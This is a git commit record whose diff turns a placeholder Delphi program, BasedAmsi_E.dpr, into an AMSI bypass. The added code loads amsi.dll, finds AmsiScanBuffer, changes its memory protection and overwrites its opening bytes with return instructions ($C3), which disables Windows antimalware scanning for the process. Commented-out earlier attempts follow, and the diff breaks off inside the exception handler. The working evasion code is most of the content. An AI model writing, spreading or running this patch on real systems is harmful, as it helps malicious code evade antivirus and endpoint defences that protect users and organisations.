c7727b301e90b4b81334d72cbfd3fdb98ad80388
p4yl0ad <p4yl0ad@protonmail.com>
2021-07-26 20:31:48 +0100

    i dont understand what the fuck

--- Experiments/BasedAmsi_E/BasedAmsi_E.dpr
+++ Experiments/BasedAmsi_E/BasedAmsi_E.dpr
@@ -4,15 +4,88 @@ program BasedAmsi_E;
 
 {$R *.res}
 
+
+
+
 uses
   SysUtils,
   Windows
   ;
 
-begin
-  try
+var
+  lib : THandle;
+  asb : Pointer;
+  SizeTee, SizeTeeArr : SIZE_T;
+  OldProtect, NewProtect : DWORD;
+  //PatBy : Byte;
 
-  WriteLn('Hello');
+  //
+  //PatArr : array[0..15] of Byte = ($4141414141414141);
+
+{https://stackoverflow.com/questions/37380445/write-the-memory-of-my-own-process-without-using-writeprocessmemory}
+function WriteBytes(pAddress: Pointer; Bytes: Array of Byte): Boolean;
+var
+  OldProtect , NewProtect : DWORD;
+begin
+  if VirtualProtect(pAddress, SizeOf(Bytes), PAGE_EXECUTE_READWRITE, @OldProtect) then
+  begin
+    Move(Bytes, pAddress^, Length(Bytes));
+    VirtualProtect(pAddress, SizeOf(Bytes), OldProtect, @NewProtect);
+    Result := True;
+  end
+  else
+  Result := False;
+end;
+
+const
+  Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
+  //Pat : Byte = ($C3);
+
+begin
+try
+  //load and find binary
+  lib := LoadLibrary('amsi.dll');
+  asb := GetProcAddress(lib,'AmsiScanBuffer');
+  WriteLn(Format('[+] dll base address: %p',[asb]));
+
+  //Change prots and write
+  WriteBytes(asb,Ass);
+  WriteLn('test');
+
+
+
+
+
+
+
+
+
+
+  //PatBy := ($C3);
+  //SizeTee := SizeOf($C3);
+  //SizeTeeArr := SizeOf(PatArr);
+
+
+
+  //Protect
+  //if VirtualProtect(asb, SizeTee, PAGE_EXECUTE_READWRITE, OldProtect);
+  //WriteLn('Test1');
+
+
+  //Write
+  //Move(PatBy, asb, SizeTee);
+
+  //WriteLn('Test2');
+
+
+
+
+  //Reprotect
+  //VirtualProtect(asb, SizeTee, PAGE_EXECUTE_READ, NewProtect);
+  //WriteLn('Test3');
+  //WriteLn('Test4');
+
+
 
   except
     on E: Exception do
